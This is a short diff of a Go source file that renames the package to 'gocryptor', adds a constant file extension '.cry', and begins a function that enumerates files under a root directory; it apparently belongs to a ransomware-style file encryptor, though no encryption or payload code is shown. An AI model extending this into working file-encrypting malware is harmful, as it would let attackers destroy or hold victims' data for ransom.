@@ -1,8 +1,12 @@
-package main
+package gocryptor
 
 import (
 	"os"
 	"path/filepath"
+)
+
+const (
+	newExtention = ".cry"
 )
 
 func enumFiles(root string) ([]string, error) {
